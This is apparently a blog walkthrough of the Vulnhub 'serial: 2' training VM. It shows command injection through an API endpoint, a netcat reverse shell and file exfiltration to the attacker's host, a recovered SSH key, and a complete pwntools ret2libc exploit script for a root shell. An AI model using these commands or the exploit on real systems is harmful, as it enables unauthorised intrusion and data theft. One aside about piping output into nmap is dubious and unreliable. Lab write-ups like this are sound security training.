---
author:
  name: "hexterisk"
date: 2020-05-09
linktitle: Serial 2
type:
- post
- posts
title: Serial 2
tags: ["Serial2", "Vulnhub", "pentesting", "penetration", "testing", "binary"]
weight: 10
categories: ["Pentesting"]
---

*   **Name**: [serial: 2](https://stackedit.io/%5Bhttps://www.vulnhub.com/entry/serial-2,373/%5D(https://www.vulnhub.com/entry/serial-2,373/))
*   **Date release**: 27 Sep 2019
*   **Author**: [sk4](https://www.vulnhub.com/author/sk4,633/)
*   **Series**: [serial](https://www.vulnhub.com/series/serial,231/)

&nbsp;

## Initial Discovery

`VMIP` is the VM’s IP Address  

`LHIP` is the Local Host’s IP Address

Compare the commands I ran, and the formats specified to check where you need to replace values according to your machine. 

### IP Discovery

Run `sudo netdiscover`.

It detects online hosts by sending ARP requests.

!["netdiscover"](/Serial_2/pmHtp_bhilEmwhFJ0EaVuopytJDO0qqDa3KdbCIKVqbOl_CMDDaxCX1q8h4e3aLkc2XpUbWhvpKxBIniTkano_6rqd64e03ezaeAsEfC0EafGfIe0R6LdGPOtrYOGwfbiCd0MVl1jkf4zngdlQ.png)
_Output of netdiscover._

192.168.1.10 happens to be the IP of the VM.

### Port Discovery

Search for any exposed ports on the VM.  

Run `nmap -sC -sV -p- -A 192.168.1.10`.  

Format: `nmap -sC -sV -p- -A VMIP`

!["nmap"](/Serial_2/4yfIFaS_awg0jySSCFWMdM5P3xRl1fXufxKqBwxxW0QKB1z9M6ZivOLCEEJiMK1WrjfplxTM16sGQJHfpQA5aEuxMt1vlpiFGIMAYLY98TvFvwgQbjO1accmc_X2X3sZqt18ti_YPrNQRTLZJg.dat)
_Output of nmap._

**Port 22** is hosting an **SSH** service is running that we might try connecting to later.

**Port 10000** has a weird service **snet-sensor-mgmt** running.

### Directory Discovery

Attempting to enumerate through all the endpoints.
Here, we are using [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) wordlist.  

Run `gobuster dir -w common.txt -u 192.168.1.10`  

Format: `gobuster dir WORDLIST -u VMIP`  

!["gobuster"](/Serial_2/2020-05-09-213611_1920x1080_scrot.png)
_Output of gobuster._

Since all endpoints return a 200 response, we try to find the ones that return 301, 401.

!["gobuster_2"](/Serial_2/1_image.png)
_Output of gobuster._

The `/api` endpoint seems to standout.

### Manual Discovery

We visit the IP. It's a website promoting a new mobile application. Poking around the website, I found that the Play Store reference downloads a file named **serial2.apk**.

!["download"](/Serial_2/jc93_Dp_WstfoFJ-4FFd-BtCwrO3HY5lAtiW2lm2ZyKrCF9zVnrp3vo30kPgTGML7HRORT7M8RksGHv6f3HWPV7UbVXDNcpQJHYnC8XXls5hCnNLtM6TV7ewOi6Ffp-eUIsFrOUMXq07JNJNZQ.png)
_Clicking on the box downloads an APK._

Further, several endpoints have been listed on the website. The `/api` discovered earlier has further endpoints.

!["api"](/Serial_2/P2M-9D6rDzVmsPHrfwxbCWpB3mbKqjqIEwPhxN3yZmSZO0bqDY-ShZ9vuTySTyIsr3m149xKFyOI0LgfGGV0lA9rLtt_c_IzLTm2EKmZwQLHicayW2QCYVzRWdcGeHz9Sxd-uzhORs-xn_afrQ.dat)
_Listed endpoints._

&nbsp;

## Hunting begins

Let's checkout the weird service running on port 10000 first.  

Run `telnet 192.168.1.10 10000`  

Format: `telnet VMIP 10000`

!["telnet"](/Serial_2/2_image.png)
_Output of telnet._

This service logs us in as the root user(since it's asking for the root user's password). As we do not have the root password yet, this is a dead end for now.

I then tried to connect to the endpoints mentioned on the webpage by making a `GET` request to `VMIP`, and received a response with a status code `401 Unauthorized`.

!["unauth"](/Serial_2/image.png)
_Response status code Unauthorized._

I tried installing the apk on an **AVD**(**Android Virtual Device**) hosted via Genymotion. It failed.

!["avd"](/Serial_2/L8-AhnXR_gool12Me8legOhPNnCM5XLGtQeLeutFX8edQd4QUBltzunAysJj_XnTKJeqN5cU7Bk-oGpDCMglEWgqa7FbYAwsV6q3XPUTZoP4dRvVRXk6KnCLHJPiZdPPhVxl4k-BiSRMprpH1Q.png)
_Failed installation on Genymotion AVD._

Alright then, we spin up JADX and reverse the apk.

Instinctively jumping to `Resources/resources.arsc/res/values/strings.xml`, I found a string token named `basic_auth`.

!["jadx"](/Serial_2/iB8ei9LOtdAVHXVOZ02R44hDg3H8-uDdN-tEUrtXKWXMd7bDADV6kti3eBVCN7BwVqbwxFakXwLUTPBtlQfiUzu95F5W8u8HQbYoFiNuDFfX3TY6X-wcTaBXm69pBpIlCUh3ASrtYRhdKX1zZw.png)
_strings.xml file of the apk._

```python
import base64
print(base64.b64decode("c2s0OmJKNiErbSUqJF0jeDc9TEE="))
```
`sk4:bJ6!+m%*$]#x7=LA`

We open postman to make a request to the endpoints we found on the website earlier, and try to use this decoded value as auth credentials.

We choose the authentication type as Basic Auth and enter:

Username: `sk4`

Password: `bJ6!+m%*$]#x7=LA`

!["basic_auth"](/Serial_2/l17DusDGH3kYb53rmjt7ks_KGstttN22t0oNq2uiDXfKBG1xLEPhxWpl1v1fhpdBfBlWAEk8H261mFg8HN9uLYsZ8dJ8qYovjOjP7AYiXIMRbfxfIlu55_--SFxHuYdNsPhX8afyKTMYC_mA7Q.dat)
_Request using credentials._

Voilà! We receive a response with status code `200 OK`.

Now, we provide the required parameter (as indicated in the response message). Moreover, piping outputs from commands into nmap is a fairly common technique used in automated recon scripts, bash jail escapes and creating vim shortcuts.

`GET` request to `192.168.1.10/api/nmap?ip=127.0.0.1 | ls -la`

Format: `VMIP/api/nmap?ip=127.0.0.1 | ls -la`

!["command_exec"](/Serial_2/uWwZIgawjVLXcTsItWyc46X8Y7CFF-fYQFEok2dQkem6GTlJk9aEvFQK0WAnBPM8MZs3f1nmNuwjDmsgjcMuPj5IJpzpalFrLaSMPqgmipBiI_ig7htTX243hwcWQnwMQEC53YuYnurwNdI9hg.dat)
_Command execution verified._

Thereafter, we try to spawn a reverse shell.

Start a listener on the host machine.

Run `nc -nlvp 4444`

Format: `nc -nlvp PORT`

And then try to connect to this listener via the VM.

Run `192.168.1.10/api/nmap?ip=127.0.0.1 | nc 192.168.1.6 4444 -e /bin/sh`

Format: `VMIP/api/nmap?ip=127.0.0.1 | nc LHIP PORT -e /bin/sh`

!["local_listener"](/Serial_2/Xq0aYQaGvXO8jBa4xXmRspLTKx6YJeKGaIhThPPFtJxp6QZ7sZwo-9p6u3JDKeaa1cV4GSmXytyV87O5oF3l63ZQPdFTE68_LjY_kn2WP5BJHMDOmbHB5gA50eJcMUxa9InNUlPPK-_WZ7_A5A.dat)
_Listener on local host._

!["connect_listener"](/Serial_2/J3p_t5lO-DvxtiRC4h2PAqcOca6TiULuaN2FHy3hfnwx4mqPoN4x2OrboYDqitRAgR1mLV0uZNAhu8UBod6gPWDDybCvgdkqA0qBPeRITsDiqYq6V-IQYBGD1Sp_lk-GEGHVNGFkbj66npXCSA.dat)
_Connect to the listener._

We pack everything inside the VM and fetch it to our local host for further analysis.

Run `tar -czvf serial2.tar.gz *`

Format: `tar -czvf FILE *`

!["tar"](/Serial_2/ZUShaAIjtmAsWKoEkpd5v6S1LTLj1F68LzCvxeqhoV9fPPfyjzcN-78l_I4Ts3oQb_KLpfZlWYvBicOC4FvVkTL5nA-W9toTO87va8dfg5FFyQd_q4S28I3C5eYZg8eJ8aVdAUCw.png)
_tar all contents._

Start a new listener on a different port and redirect all the data received on it into a file.

Run `nc -nlvp 1337 > serial2.tar.gz`

Format: `nc -nlvp NewPORT > FILENAME`

!["local_listener"](/Serial_2/GUTZ4WnglKqrfCZbvBsDQZNhX-kDwOemheRlfVMKmETVgOB6bGIYsF4Do4OnNYV5fQ_jIbOe0ohaAC37WWpRUTGAnarRMe9QIVNiaPWuxqEoPl5gJvMORm2Z1oeQTOflUN_5FnsccRuMf5AW8A.dat)
_Pipe all input from the listener to file._

Pipe all bytes from the file into the listener.

Run `cat serial2.tar.gz | nc 192.168.1.6 1337`

Format: `cat FILE | nc LHIP NewPORT`

!["connect_listener"](/Serial_2/s8HdLB48dPURowb5aSbZkWXSWhnp9ZsG98jCJupqefo1qqezBX21XlMdLmI5f4VB92RLPYYc2nWd4J31-fiHzF8hAL9BqJRMbHU_iKGGgT-JMCd0uQHAz5s_X7rVvW201c-vUa6woPIkZcNLVA.png)
_Send all bytes of the file to the listener._

Exploring all the files, we spot a .git folder.

Instinctively, we check the git log.

Run `git log`

!["git_log"](/Serial_2/Epy59D1WxRBj_CWmWz2fAL41lpbsrt1nt6tWpEXlw-qbT4hh_wrlDBK8CZwjgE4hrnxAbqaaCteI8LxWsX3l-MoYalO1J9MCfMciZyQf2C_YcbZkOGsHBIA0W4UYDj6q4jiE9Ddu9jzqbneYTQ.png)
_Output of git log._

The commit message straight up implies that some keys have been removed.

We therefore check the state of the files before this commit. This means rolling back to the previous commit. 

Run `git checkout b039a4207810e47cde90db811661217af2bc67c3`

!["git_checkout"](/Serial_2/C2GCkwoXPhPVpC0H24HrAexqs_ubqs7_UaRff_Vhg07KaAyRaHKgWajajasXE1804ytCpQDW7JtbRuQSg0hrjq5v7yh9KmKLUrIu9t06WCYQz4o2VvJPFHfeYXrrtU7DsIMGQJnIgnULPVx1uw.dat)
_Rolling back to the commit whose hash was specified._

Looking around, I spot a RSA keypair.

!["rsa_keypair"](/Serial_2/miV283IclOl-rWur5f2jWFnIzW2pD2vFw4deSXHu8SOiSylfqU1mwIIlj1ZStiMtBI1pmgqAwDlVmMu4u6XZ5UJbH-hJwdJoXcPhcp8gkd8OvQVbaNrDyZFn-KFGbA0firobBZV2C3j7LUlnWA.dat)
_RSA keypair spotted._

We can use this private key to connect to the SSH service running on the VM.

!["bad_permissions"](/Serial_2/XjMmGS3OaORnF9CCOzVC2ULTe6eACS-kDCb76GpiAlzLLzcGs3_3c131QChhDA42M0eWHKstymG-vjwNiL7X1hYpD9IeLxxqcjx7u_bY8_yeu4n9gEvJOwlunq0_fTPHqSnGo9Qf-HRDTtis7w.dat)
_A bad permissions error is shown._

A bad permission error is thrown. This is because the key does not have appropriate permissions.

Run `chmod 0600 id_rsa`

!["chmod"](/Serial_2/lahZm8F34fGKorE7zH17KJQHsdKvpNPB82hOmzLQKqmyjoBF-VqT2rEcSOOQS3ijnGcAOv3TfP_Devbe6opjBUb-FWH3Az-bzFz9bAj5UQKgquiGGYdO8r3GC5-8mok5u7rXxh_lnGvlwXFFrw.dat)
_Modifying permissions of the key._

This time the connection attempt is successful.

!["connect_success"](/Serial_2/-rFLRB8gbOfs3hGSOdfKceCuB1pkbI5iDmnTSGlIOKAQsuNi7NNGkCyiWs4p8_vJo_mHR7RKrXXyQcixm9tPKRZA--JxmZG7ktfRnPT5fL48yuTqKNWpAF6wR55nC4UxeuIq7uzyPM3fwvsXfw.dat)
_SSH connected._

Run `ls -la`

!["ls"](/Serial_2/5jFaFA8pi8B_7f90fPCpxjby7v-hDW56BZYu1SABYdmHJh2Tv3dJtY-VaD4nxA0mcqkZgf9cBGcNEe7wDIS9I0fKA-FstwqZrmNJgl-Trgc_UvKXHtYAcKJidIOloNF4OEhe-Oa4i9IriuAL9g.dat)
_flag.txt can be seen._

Run `cat flag.txt`

!["flag"](/Serial_2/aYqY6XNq15cVNRvFkhxyIcmHjhGye39-EHYnfeIvHEUgVGpV5Jp5DnJxnOGYJztofABMp-4YEKN0PT-WkM3TPUbRwSCuh9QkMKuk2uxhoK3NViVSqKVAdCMr6dMpVXJ9f2uR8QB0MUQscWCdNw.dat)
_flag,txt_

We got our first flag. This must be the user flag since we are logged in as `sk4`.

The service running on port 10000 was asking for the root user's password. Since it definitely would be running some sort of a check on the password entered, let's try and find the binary served on the port and see if we can something in it.

Run `netstat -tulpn | grep :10000`

It displays all the connections, and the corresponding information.

!["netstat"](/Serial_2/3_image.png)
_Output of netstat._

The service is most probably being run by root.

I took the approach of hit and trial trying to find files using the words printed on the terminal before it asks for a password.

I got a hit with the word **backd00r**.

Run `find / -name backd00r`

Format: `find / -name WORD`

!["backd00r"](/Serial_2/4_image.png)
_File found named backd00r._

I executed it once to verify that it is indeed the binary being served on port 10000.

Fetch it to local host for further analysis, just like we did with the tar of all files earlier.

Start a new listener and redirect all the data received on it into a file.

Run `nc -nlvp 1337 > backd00r`

Format: `nc -nlvp PORT > BINARYNAME`

!["local_listener"](/Serial_2/5_image.png)
_Pipe all input from the listener to file._

Pipe all bytes from the file into the listener.

Run `cat /bin/backd00r | nc 192.168.1.6 1337`

Format: `cat /bin/backd00r | nc LHIP PORT`

!["connect_listener"](/Serial_2/6_image.png)
_Send all bytes of the file to the listener._

Run `chmod +x backd00r` to give the binary execution permissions.

We run a strings on the binary.

Run `strings backd00r`

Format: `strings BINARYNAME`

!["strings"](/Serial_2/7_image.png)
_Output of strings._

> root@serial2.vulnab's password:
>
> j&9GCS34MY+^4ud\*

It indicates that the following string is root password. So we make another attempt to login to the service using this password.

We then try and execute the binary from the user shell.

!["root"](/Serial_2/15_image.png)
_Obtained root shell._

The password is validated and we get the root shell. However, it does not allow us to read the `flag.txt` file. The shell is clearly a restricted one.

Similar thing happens when I try this tactic via the service on port 10000 from local host. Clearly there's more to the binary than we initially thought.

We are now getting into the arena of binary exploitation. You could just skip ahead to the end and use the given script to pwn the service if you do not want to get into this section.

&nbsp;

## Binary Exploitation

We open the binary in IDA.

The binary is short and sweet, and there's not much to it.

![](/Serial_2/10_image.png)
_The "main" function of the binary._

We take a look at the _login_ function here, since root password is all we desire. 

![](/Serial_2/17_image.png)
_The "login" function of the binary._

It turns out that the string we found indeed is the value against which are input is verified, though we still don't know if it is the root password. We therefore try to escalate to the root user via the shell of user **sk4**.

![](/Serial_2/11_image.png)
_Root user auth failure._

But to no avail. It's settled then, the string we had found isn't the root user's password.

Looking around in the _loop_ function, I realise that the prompt we are presented with after entering the password is not that of a shell at all, it's just a case riddled input.

![](/Serial_2/13_image.png)
_The "loop" function of the binary._

We need to pwn the binary.

We analyse the binary using GDB-Peda.

![](/Serial_2/18_image.png)
_Checking security measures applied on the binary._

Clearly this binary is open to the existence of buffer overflow and GOT overwrite vulnerabilities. The binary is not a PIE binary, however the system is expected to have ASLR enabled. Since NX is enabled, we cannot push a shellcode on the stack. Rather, we would have to build a ROP chain for arbitrary code execution.

This can be confirmed by checking the value in the file **/proc/sys/kernel/randomize_va_space**.

Run `cat /proc/sys/kernel/randomize_va_space`

![](/Serial_2/19_image.png)
_ASLR enabled._

Since PIE is_ disabled, only the base address of `libc` will be randomised, while the base address of the binary will remain constant. And since the offset of different sections of the binary are constant, we can find the address of a frequently occuring function like `puts` or `gets` in the `plt section` and use it to leak the address of `libc`. The library is in **/lib/x86_64-linux-gnu/** in modern 64-bit standard distributions by default.

Start a new listener and redirect all the data received on it into a file.

Run `nc -nlvp 1337 > libc.so.6`

Format: `nc -nlvp PORT > LIBNAME`

![](/Serial_2/21_image.png)
_Pipe all input from the listener to file._

Pipe all bytes from the file into the listener.

Run `cat /lib/x86_64-linux-gnu/libc.so.6 | nc 192.168.1.6 1337`

Format: `cat /lib/x86_64-linux-gnu/libc.so.6 | nc LHIP PORT`

![](/Serial_2/22_image.png)
_Send all bytes of the file to the listener._

Set the **LD\_LIBRARY\_PATH** environment variable to the path of this library to ensure that the binary uses this particular libc.

Analysing the binary, I found a buffer overflow vulnerability.

![](/Serial_2/16_image.png)
_Buffer overflow vulnerability in the "loop" function of the binary._

Playing with the input, I was able to cause a SIGSEGV through instruction pointer corruption.

![](/Serial_2/20_image.png)
_SIGSEGV encountered._

The value stored in the instruction pointer at the time of the error is compared against the input provided, and it is found that the input buffer is only 72 bytes far from the saved return address on stack.

We use the **pwntools** library to build our exploit script.

Finding the relevant addresses:

Run  `objdump -d -M intel backd00r | grep puts`

![](/Serial_2/23_image.png)
_Address of puts@plt._

Run `readelf -r backd00r | grep puts`

![](/Serial_2/25_image.png)
_Address of puts in libc._

Run `ropper --file backd00r --search "pop rdi"`

![](/Serial_2/26_image.png)
_Address of gadget._

Following is the final script used to exploit the service:

```python
#!/usr/bin/env python3
from pwn import *

libc = ELF('libc.so.6', checksec = False)

offset_binsh = next(libc.search(b'/bin/sh'))
offset_puts = libc.sym['puts']
offset_system = libc.sym['system']

address_gadget = 0x400bb3

got_puts = 0x602018
plt_puts = 0x4005c0
loop = 0x4009c9

def exploit(r):
    pause()
    # Pass the password check to reach the prompt.
    r.recvuntil("vulnab's password: ")
    r.sendline("j&9GCS34MY+^4ud*")
    response = r.recvline()
    while "password: Permission denied" in response.decode("utf-8"):
        r.sendline("j&9GCS34MY+^4ud*")
        response = r.recvline()

    # To cause buffer overflow right up till the return address on stack.
    # Then form a ROP chain.
    junk = b"A"*72
    chain = junk
    chain += p64(address_gadget)
    chain += p64(got_puts)
    chain += p64(plt_puts)
    chain += p64(loop)
    r.sendline(chain)
    print(r.recvline())

    # Giving the exit command would cause this function to return, thus transferring
    # control our ROP chain.
    r.sendline("exit")

    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())
    print(r.recvline())

    # The last line received contains the leaked address.
    # We take out the first 8 bytes, i.e. the base address.
    leak = r.recvline(False)[:8]
    leak += b'\x00'*(8-len(leak))
    puts = u64(leak)
    print("Leaked 'puts' address: ", hex(puts))
    print("'puts' offset: ", hex(offset_puts))
    libc_base = puts - offset_puts
    print("libc base address: ", hex(libc_base))

    # We create a new ROP chain to get the shell.
    chain = junk
    chain += p64(address_gadget)
    chain += p64(libc_base + offset_binsh)
    chain += p64(libc_base + offset_system)
    chain += p64(address_gadget)
    chain += p64(libc_base + offset_binsh)
    chain += p64(libc_base + offset_system)
    r.sendline(chain)

    print(r.recvline())
    r.sendline("exit")
    print(r.recvline())
    r.interactive()

if __name__ == "__main__":
    r = remote("192.168.1.10", 10000)
    exploit(r)
```

![](/Serial_2/27_image.png)
_Root flag._
